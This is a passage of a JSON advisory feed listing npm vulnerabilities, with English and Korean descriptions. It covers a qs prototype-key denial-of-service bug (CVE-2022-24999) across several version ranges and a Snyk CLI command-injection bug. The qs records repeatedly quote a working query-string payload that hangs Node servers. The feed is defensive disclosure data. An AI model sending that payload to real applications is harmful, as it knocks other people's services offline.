    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.4.0, < 6.4.1",
    "identifier": "6.4.1",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.5.0, < 6.5.3",
    "identifier": "6.5.3",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.6.0, < 6.6.1",
    "identifier": "6.6.1",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.7.0, < 6.7.3",
    "identifier": "6.7.3",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.8.0, < 6.8.3",
    "identifier": "6.8.3",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.9.0, < 6.9.7",
    "identifier": "6.9.7",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
    "identifiers": "GHSA : GHSA-hrpp-h998-j3pp\nCVE : CVE-2022-24999",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T09:13:58Z",
    "publishedAt": "2022-11-27T00:30:50Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999\nhttps://github.com/ljharb/qs/pull/428\nhttps://github.com/n8tz/CVE-2022-24999\nhttps://github.com/ljharb/qs/commit/4310742efbd8c03f6495f07906b45213da0a32ec\nhttps://github.com/ljharb/qs/commit/727ef5d34605108acb3513f72d5435972ed15b68\nhttps://github.com/ljharb/qs/commit/73205259936317b40f447c5cdb71c5b341848e1b\nhttps://github.com/ljharb/qs/commit/8b4cc14cda94a5c89341b77e5fe435ec6c41be2d\nhttps://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1\nhttps://github.com/ljharb/qs/commit/e799ba57e573a30c14b67c1889c7c04d508b9105\nhttps://github.com/ljharb/qs/commit/ed0f5dcbef4b168a8ae299d78b1e4a2e9b1baf1f\nhttps://github.com/ljharb/qs/commit/f945393cfe442fe8c6e62b4156fd35452c0686ee\nhttps://github.com/ljharb/qs/commit/fc3682776670524a42e19709ec4a8138d0d7afda\nhttps://github.com/expressjs/express/releases/tag/4.17.3\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00039.html\nhttps://github.com/advisories/GHSA-hrpp-h998-j3pp",
    "name": "qs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.10.0, < 6.10.3",
    "identifier": "6.10.3",
    "descriptionKR": "6.10.3 이전의 qs는 `__ proto__` 키를 사용할 수 있기 때문에 공격자가 노드 프로세스를 정지시킬 수 있습니다. 많은 일반적인 웹 프레임워크 사용 사례에서 인증되지 않은 원격 공격자는 애플리케이션을 방문하는 데 사용되는 URL의 쿼리 문자열(예: `a[__proto__]=b&a[__proto__]&a[length]=100000000)에 공격 페이로드를 배치할 수 있습니다. `. 수정 사항은 qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3 및 6.2.4로 백포트되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "@snyk/snyk-cocoapods-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.5.3",
    "identifier": "2.5.3",
    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "snyk-docker-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.6.5",
    "identifier": "5.6.5",
    "descriptionKR": "1.1064.0 이전의 패키지 snyk; 패키지 snyk-mvn-plugin 2.31.3 이전; 패키지 snyk-gradle-plugin 3.24.5 이전; 패키지 @snyk/snyk-cocoapods-plugin 2.5.3 이전; 패키지 snyk-sbt-plugin 2.16.2 이전; 패키지 snyk-python-plugin 1.24.2 이전; 패키지 snyk-docker-plugin 5.6.5 이전; 1.1.6 이전의 패키지 @snyk/snyk-hex-plugin은 [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK에 대한 불완전한 수정으로 인해 명령 주입에 취약합니다. -3037342). 악용에 성공하면 공격자는 조작된 명령줄 플래그를 전달하여 Snyk CLI가 설치된 호스트 시스템에서 임의의 명령을 실행할 수 있습니다. 이 취약점을 악용하려면 사용자는 신뢰할 수 없는 파일에서 snyk test 명령을 실행해야 합니다. 대부분의 경우 Snyk CLI에 대한 명령줄 인수를 제어하도록 배치된 공격자는 이미 임의의 명령을 실행하도록 배치되어 있습니다. 그러나 이는 개발자가 통합/빌드 파이프라인에 대한 더 광범위한 공격의 일부로 이 구성 요소를 활용하기 위해 Snyk CLI에 전달된 인수를 제어할 수 있는 지속적인 통합 파이프라인과 같은 특정 시나리오에서 남용될 수 있습니다. 이 문제는 2022년 11월 29일 현재 https://hub.docker.com/r/snyk/snyk에서 제공되는 최신 Snyk Docker 이미지에서 해결되었습니다. 해당 날짜 이전에 다운로드 및 빌드된 이미지는 업데이트해야 합니다. 이 문제는 버전 v20221130.093605의 Snyk TeamCity CI/CD 플러그인에서도 해결되었습니다."
  },
  {
    "description": "The package snyk before 1.1064.0; the package snyk-mvn-plugin before 2.31.3; the package snyk-gradle-plugin before 3.24.5; the package @snyk/snyk-cocoapods-plugin before 2.5.3; the package snyk-sbt-plugin before 2.16.2; the package snyk-python-plugin before 1.24.2; the package snyk-docker-plugin before 5.6.5; the package @snyk/snyk-hex-plugin before 1.1.6 are vulnerable to Command Injection due to an incomplete fix for [CVE-2022-40764](https://security.snyk.io/vuln/SNYK-JS-SNYK-3037342). A successful exploit allows attackers to run arbitrary commands on the host system where the Snyk CLI is installed by passing in crafted command line flags. In order to exploit this vulnerability, a user would have to execute the snyk test command on untrusted files. In most cases, an attacker positioned to control the command line arguments to the Snyk CLI would already be positioned to execute arbitrary commands. However, this could be abused in specific scenarios, such as continuous integration pipelines, where developers can control the arguments passed to the Snyk CLI to leverage this component as part of a wider attack against an integration/build pipeline. This issue has been addressed in the latest Snyk Docker images available at https://hub.docker.com/r/snyk/snyk as of 2022-11-29. Images downloaded and built prior to that date should be updated. The issue has also been addressed in the Snyk TeamCity CI/CD plugin as of version v20221130.093605.",
    "identifiers": "GHSA : GHSA-4x6g-3cmx-w76r\nCVE : CVE-2022-22984",
    "severity": "MODERATE",
    "updatedAt": "2023-08-08T21:30:43Z",
    "publishedAt": "2022-11-30T15:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-22984\nhttps://github.com/snyk/cli/commit/80d97a93326406e09776156daf72e3caa03ae25a\nhttps://github.com/snyk/snyk-cocoapods-plugin/commit/c73e049c5200772babde61c40aab57296bf91381\nhttps://github.com/snyk/snyk-docker-plugin/commit/d730d7630691a61587b120bb11daaaf4b58a8357\nhttps://github.com/snyk/snyk-gradle-plugin/commit/bb1c1c72a75e97723a76b14d2d73f70744ed5009\nhttps://github.com/snyk/snyk-hex-plugin/commit/e8dd2a330b40d7fc0ab47e34413e80a0146d7ac3\nhttps://github.com/snyk/snyk-mvn-plugin/commit/02cda9ba1ea36b00ead3f6ec2de0f97397ebec50\nhttps://github.com/snyk/snyk-python-plugin/commit/8591abdd9236108ac3e30c70c09238d6bb6aabf4\nhttps://github.com/snyk/snyk-sbt-plugin/commit/99c09eb12c9f8f2b237aea9627aab1ae3cab6437\nhttps://security.snyk.io/vuln/SNYK-JS-SNYK-3038622\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKDOCKERPLUGIN-3039679\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKGRADLEPLUGIN-3038624\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKMVNPLUGIN-3038623\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKPYTHONPLUGIN-3039677\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSBTPLUGIN-3038626\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625\nhttps://security.snyk.io/vuln/SNYK-JS-SNYKSNYKHEXPLUGIN-3039680\nhttps://www.imperva.com/blog/how-scanning-your-projects-for-security-issues-can-lead-to-remote-code-execution/\nhttps://github.com/advisories/GHSA-4x6g-3cmx-w76r",
    "name": "snyk-gradle-plugin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.24.5",
    "identifier": "3.24.5",
